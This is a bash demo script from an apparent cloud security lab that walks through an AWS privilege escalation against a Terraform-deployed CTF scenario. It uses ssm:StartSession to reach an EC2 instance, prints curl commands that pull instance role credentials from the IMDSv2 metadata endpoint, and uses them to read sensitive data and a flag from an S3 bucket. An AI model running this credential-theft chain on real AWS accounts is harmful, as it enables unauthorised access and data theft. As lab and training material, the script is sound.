#!/bin/bash

# Demo script for ssm:StartSession privilege escalation to S3 bucket
# This scenario demonstrates how a user with ssm:StartSession can remotely access
# EC2 instances with S3 access roles to extract credentials and access sensitive buckets


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-ssm-001-to-bucket-starting-user"
EC2_BUCKET_ROLE="pl-prod-ssm-001-to-bucket-ec2-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}SSM StartSession to S3 Bucket Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_ssm_001_ssm_startsession.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
INSTANCE_ID=$(echo "$MODULE_OUTPUT" | jq -r '.ec2_instance_id')
EC2_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.ec2_bucket_role_name')
TARGET_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.target_bucket_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

if [ "$INSTANCE_ID" == "null" ] || [ -z "$INSTANCE_ID" ]; then
    echo -e "${RED}Error: Could not extract instance ID from terraform output${NC}"
    echo "The EC2 instance may not be ready yet. Wait a few minutes and try again."
    exit 1
fi

if [ "$TARGET_BUCKET" == "null" ] || [ -z "$TARGET_BUCKET" ]; then
    echo -e "${RED}Error: Could not extract bucket name from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo "Target Instance: $INSTANCE_ID"
echo "Target Role: $EC2_ROLE_NAME"
echo "Target Bucket: $TARGET_BUCKET"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have bucket access yet
echo -e "${YELLOW}Step 4: Verifying we don't have bucket access yet${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Attempting to access bucket: $TARGET_BUCKET"
show_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION"
if aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access bucket (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Step 5: Discover target EC2 instance (optional but helpful)
echo -e "${YELLOW}Step 5: Discovering target EC2 instance${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
echo "Listing EC2 instances with their attached IAM roles..."
show_cmd "ReadOnly" "aws ec2 describe-instances --region $AWS_REGION --instance-ids $INSTANCE_ID --query 'Reservations[0].Instances[0].[InstanceId,State.Name,IamInstanceProfile.Arn]' --output text"
INSTANCE_INFO=$(aws ec2 describe-instances \
    --region $AWS_REGION \
    --instance-ids $INSTANCE_ID \
    --query 'Reservations[0].Instances[0].[InstanceId,State.Name,IamInstanceProfile.Arn]' \
    --output text 2>/dev/null || echo "")

if [ -n "$INSTANCE_INFO" ]; then
    echo "Instance ID: $(echo $INSTANCE_INFO | awk '{print $1}')"
    echo "State: $(echo $INSTANCE_INFO | awk '{print $2}')"
    echo "Instance Profile: $(echo $INSTANCE_INFO | awk '{print $3}')"
    echo -e "${GREEN}✓ Found target instance with S3 access role${NC}"
else
    echo -e "${YELLOW}⚠ Could not describe instance (may not have ec2:DescribeInstances permission)${NC}"
    echo "Proceeding with instance ID from Terraform: $INSTANCE_ID"
fi
echo ""

# [OBSERVATION] Step 6: Check SSM agent status
echo -e "${YELLOW}Step 6: Checking if instance is ready for SSM sessions${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
echo "Verifying SSM agent is running on the instance..."

MAX_RETRIES=5
RETRY_COUNT=0
SSM_READY=false

while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
    show_cmd "ReadOnly" "aws ssm describe-instance-information --region $AWS_REGION --filters "Key=InstanceIds,Values=$INSTANCE_ID" --query 'InstanceInformationList[0].PingStatus' --output text"
    SSM_STATUS=$(aws ssm describe-instance-information \
        --region $AWS_REGION \
        --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
        --query 'InstanceInformationList[0].PingStatus' \
        --output text 2>/dev/null || echo "")

    if [ "$SSM_STATUS" = "Online" ]; then
        echo -e "${GREEN}✓ SSM agent is online and ready${NC}"
        SSM_READY=true
        break
    else
        RETRY_COUNT=$((RETRY_COUNT + 1))
        if [ $RETRY_COUNT -lt $MAX_RETRIES ]; then
            echo "SSM agent not ready yet (attempt $RETRY_COUNT/$MAX_RETRIES), waiting 10 seconds..."
            sleep 10
        fi
    fi
done

if [ "$SSM_READY" = false ]; then
    echo -e "${RED}Error: SSM agent is not ready on instance $INSTANCE_ID${NC}"
    echo "The instance may still be initializing. Please wait a few minutes and try again."
    exit 1
fi
echo ""

# [EXPLOIT] Step 7: Start interactive SSM session to extract credentials
echo -e "${YELLOW}Step 7: Starting SSM session to extract instance role credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}INTERACTIVE SESSION INSTRUCTIONS${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""
echo "You are about to enter an interactive SSM session on the EC2 instance."
echo "This is the privilege escalation vector - the instance has a role with S3 access attached."
echo ""
echo -e "${YELLOW}Once connected, run these commands:${NC}"
echo ""
echo -e "${GREEN}# Step 1: Get IMDSv2 token${NC}"
echo 'TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)'
echo ""
echo -e "${GREEN}# Step 2: Save the role name as a variable${NC}"
echo 'ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)'
echo ""
echo -e "${GREEN}# Step 3: Extract the credentials using the role name variable${NC}"
echo 'curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null'
echo ""
echo -e "${YELLOW}Copy the JSON output - you'll need it to configure AWS CLI credentials.${NC}"
echo -e "${YELLOW}Type 'exit' to leave the session when done.${NC}"
echo ""
echo -e "${BLUE}========================================${NC}"
echo ""
echo "Press ENTER to start the SSM session..."
read

# Start the interactive session
show_attack_cmd "Attacker" "aws ssm start-session --region $AWS_REGION --target $INSTANCE_ID"
aws ssm start-session \
    --region $AWS_REGION \
    --target $INSTANCE_ID

# After session ends
echo ""
echo -e "${GREEN}✓ SSM session ended${NC}\n"

# [EXPLOIT] Step 8: Configure extracted credentials (dynamically extracted from EC2 IMDS)
echo -e "${YELLOW}Step 8: Configuring extracted credentials${NC}"
echo ""
echo "Now we'll configure the credentials you extracted from the instance."
echo "You should have copied a JSON response that looks like:"
echo ""
echo '{'
echo '  "AccessKeyId": "ASIA...",  '
echo '  "SecretAccessKey": "...",  '
echo '  "Token": "...",  '
echo '  "Expiration": "..."  '
echo '}'
echo ""
echo -e "${YELLOW}Paste the complete JSON output here (press ENTER when done):${NC}"

# Read multi-line JSON input
echo "Reading JSON input..."
CREDS_JSON=""
while IFS= read -r line; do
    CREDS_JSON="${CREDS_JSON}${line}"
    # Stop when we find a closing brace at the start of a line or alone
    if [[ "$line" =~ ^[[:space:]]*\}[[:space:]]*$ ]]; then
        break
    fi
done

if [ -z "$CREDS_JSON" ]; then
    echo -e "${RED}Error: No credentials provided${NC}"
    echo "Please run the demo again and copy the credentials from the SSM session"
    exit 1
fi

# Parse credentials
EXTRACTED_ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.AccessKeyId // .Credentials.AccessKeyId')
EXTRACTED_SECRET_KEY=$(echo "$CREDS_JSON" | jq -r '.SecretAccessKey // .Credentials.SecretAccessKey')
EXTRACTED_SESSION_TOKEN=$(echo "$CREDS_JSON" | jq -r '.Token // .SessionToken // .Credentials.SessionToken')

if [ -z "$EXTRACTED_ACCESS_KEY" ] || [ "$EXTRACTED_ACCESS_KEY" = "null" ]; then
    echo -e "${RED}Error: Failed to parse credentials from JSON${NC}"
    echo "Please ensure you copied the complete JSON output from IMDS"
    exit 1
fi

echo ""
echo "Extracted Access Key ID: ${EXTRACTED_ACCESS_KEY:0:10}..."
echo "Switching to extracted credentials..."

export AWS_ACCESS_KEY_ID="$EXTRACTED_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$EXTRACTED_SECRET_KEY"
export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify new identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
NEW_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text 2>/dev/null || echo "")

if [ -z "$NEW_IDENTITY" ]; then
    echo -e "${RED}Error: Could not verify identity with extracted credentials${NC}"
    echo "Please check that you entered the credentials correctly"
    exit 1
fi

echo "New identity: $NEW_IDENTITY"
echo -e "${GREEN}✓ Now using extracted EC2 instance role credentials${NC}\n"

# [EXPLOIT] Step 9: Verify bucket access (using extracted EC2 instance role credentials)
echo -e "${YELLOW}Step 9: Verifying S3 bucket access${NC}"
echo "Attempting to access bucket: $TARGET_BUCKET"

echo -e "\nListing bucket contents..."
show_attack_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION"
if aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION; then
    echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}"
else
    echo -e "${RED}✗ Failed to list bucket${NC}"
    exit 1
fi

echo -e "\nReading sensitive data file..."
show_attack_cmd "Attacker" "aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt - --region $AWS_REGION"
if aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt - --region $AWS_REGION; then
    echo -e "\n${GREEN}✓ Successfully read sensitive data!${NC}"
    echo -e "${GREEN}✓ BUCKET ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to read sensitive data${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 10: Capture the CTF flag
echo -e "${YELLOW}Step 10: Capturing the CTF flag${NC}"
echo "Reading flag.txt from the target bucket..."
show_attack_cmd "Attacker" "aws s3 cp s3://$TARGET_BUCKET/flag.txt - --region $AWS_REGION"
FLAG_VALUE=$(aws s3 cp s3://$TARGET_BUCKET/flag.txt - --region $AWS_REGION 2>/dev/null)
if [ -n "$FLAG_VALUE" ]; then
    echo ""
    echo -e "${GREEN}✓ FLAG CAPTURED:${NC} $FLAG_VALUE"
else
    echo -e "${RED}✗ Failed to read flag.txt${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with ssm:StartSession permission)"
echo "2. Started interactive SSM session on EC2 instance: $INSTANCE_ID"
echo "3. Extracted instance role credentials from metadata service (IMDSv2)"
echo "4. Used credentials from: $EC2_BUCKET_ROLE"
echo "5. Achieved: S3 Bucket Access to $TARGET_BUCKET"
echo "6. Captured CTF flag: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (ssm:StartSession) → EC2 Instance"
echo -e "  → (Extract Credentials via IMDS) → $EC2_BUCKET_ROLE → S3 Bucket → flag.txt (CTF flag)"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo ""
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- SSM session on instance: $INSTANCE_ID"
echo "- Extracted role: $EC2_BUCKET_ROLE"
echo "- Accessed bucket: $TARGET_BUCKET"

echo -e "\n${BLUE}MITRE ATT&CK Techniques:${NC}"
echo "- T1021.007: Remote Services: Cloud Services (SSM Session Manager)"
echo "- T1552.005: Unsecured Credentials: Cloud Instance Metadata API"
echo "- T1078.004: Valid Accounts: Cloud Accounts"

echo -e "\n${YELLOW}Note: SSM session history is automatically logged in CloudTrail${NC}"
echo -e "${YELLOW}This scenario does not create persistent artifacts that require cleanup${NC}"
echo -e "${YELLOW}To clean up environment variables (optional):${NC}"
echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
